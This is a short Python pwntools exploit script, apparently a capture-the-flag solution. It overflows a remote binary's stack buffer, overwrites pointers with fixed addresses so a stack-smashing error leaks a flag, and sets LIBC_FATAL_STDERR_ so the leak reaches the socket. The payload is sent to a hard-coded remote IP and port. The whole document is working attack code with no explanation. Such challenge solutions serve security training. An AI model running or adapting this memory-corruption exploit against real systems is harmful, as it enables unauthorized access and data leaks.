from pwn import *

flag = p64(0x400D20)
controlled_buf = p64(0x600D20)

redirect = 'LIBC_FATAL_STDERR_=2;\x00'


payload = "A"*280 + cyclic(256)
payload += flag + p64(0) + controlled_buf + p64(0)

payload2 = "LIBC_FATAL_STDERR_=1\x00"

with open("lollai", "w") as f:
    f.write(payload+"\n"+payload2+'\n')


#with remote('localhost', 4000) as r:
with remote('136.243.194.62', 1024) as r:

    print r.recvuntil("name?")
    r.sendline(payload)

    print r.recvuntil("flag: ")
    r.sendline(payload2)
    print r.recvall(timeout=1)
